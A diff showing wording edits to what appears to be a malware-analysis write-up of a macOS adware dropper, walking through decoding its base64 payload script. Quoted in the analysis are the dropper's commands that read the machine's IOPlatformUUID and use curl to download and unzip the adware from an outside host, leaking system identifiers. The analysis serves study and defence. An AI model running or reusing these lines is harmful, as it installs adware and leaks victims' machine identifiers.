@@ -69,7 +69,7 @@ Player_061.app/Contents/Resources/enc: ASCII text
 *You can find base64 encrypted content here:* [`enc`](https://gist.github.com/oxynux/0221cfe7920f0a8d22ec75f5f63c3f25).
 
 
-So, we have here a bash script and a base64 encoded text file.
+Here, we have a bash script and a base64 encoded text file.
 
 ### Decrypt `enc`
 
@@ -91,10 +91,10 @@ eval: eval [arg ...]
 ```
 Pretty easy, right ?
 
-So eval basicly concatenates all arguments and then executes the result as a command.
+Eval basically concatenates all arguments and executes the result as a command.
 We don't want to install this Adware so we are going to replace the last `eval` by `echo` which only print out the script instead of running it: [`decrypted_enc.sh`](https://gist.github.com/oxynux/460e01bf0045524af8a3bced006cf1ad/90ccb26323a6abfd5f19dcce425cada627e76df5).
 
-Then `chmod +x decrypted_enc.sh` and then execute it.
+`chmod +x decrypted_enc.sh` and then execute it.
 
 We obtain this (spoiler it's again a bash script! Script-ception never end): [`final_decrypted_enc.sh`](https://gist.github.com/oxynux/98636477186b97834f8300ac80e6df8b/1b73f0d053a68fe12d2bca7b5b8cdc7f1102fdad).
 
@@ -103,11 +103,11 @@ We obtain this (spoiler it's again a bash script! Script-ception never end): [`f
 This script has a lot of variables, but they are not prefixed by `export ` because it's useless inside an `eval`.
 So we have to slightly modify it to make it work outside an `eval`:
 
-- We add `export` before every variable, and remove `>/dev/null 2>&1` whom silence `stderr` and `stdout`, also we add `-v` to the `curl` command for debugging purposes.
+- We add `export` before every variable, and remove `>/dev/null 2>&1` whom silence `stderr` and `stdout`, we also add `-v` to the `curl` command for debugging purposes.
 
 - We also want to catch all variables values of this script, so we add a `echo interesting_var=$interesting_var` for all of these. 
 
-- Finally we want to print script lines as they are read to follow along while it's running. `set -v` allows us to do this.
+- Finally, we want to print script lines as they are read to follow along while it's running. `set -v` allows us to do this.
 
 - One last thing: we definitely don't want to install the Adware so we comment the last two lines -which open the malicious file and make it executable- with `#`.
 
@@ -115,9 +115,9 @@ Here is the final script ready to launch: [`final_decrypted_enc.sh`](https://gis
 
 ### (What does this script do?)²
 
-After this we can launch the script to understand better how it works.
+After this we can launch the script to better understand how it works.
 
-Here the interesting outputs:
+Here's the interesting outputs:
 
 _MacOS version_
 ```
@@ -137,7 +137,7 @@ echo -n "$(ioreg -rd1 -c IOPlatformExpertDevice | grep -o '"IOPlatformUUID" = "\
 machine_id=XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX
 ```  
 
-_The url to download the malware: it use `$os_version`, `$session_guid` and `$machine_id`_
+_The url to download the malware: it uses `$os_version`, `$session_guid` and `$machine_id`_
 ```
 url="http://api.binarysources.com/sd/?c=_pl_GJybQ==&u=$machine_id&s=$session_guid&o=$os_version&b=4862950061"
 curl -v -f0L "$url" >>$tmp_path
@@ -150,8 +150,8 @@ unzip -P "$unzip_password" "$tmp_path" -d "$app_dir"
 ```  
 
 
-So this script use `curl` to download the malware, it share with [query string](https://en.wikipedia.org/wiki/Query_string) the macOS version, an UUID and the IOPlatformUUID of the victim.
-I think the malware is genreated thanks to this, it aims to be unique so it can dupe [Apple Gatekeeper](https://en.wikipedia.org/wiki/Gatekeeper_(macOS)).
+This script uses `curl` to download the malware, share the macOS version, UUID and the IOPlatformUUID of the victim to the server with [query string](https://en.wikipedia.org/wiki/Query_string).
+I think the malware is generated thanks to this, it aims to be unique so it can dupe [Apple Gatekeeper](https://en.wikipedia.org/wiki/Gatekeeper_(macOS)).
 
 ### Side note
 
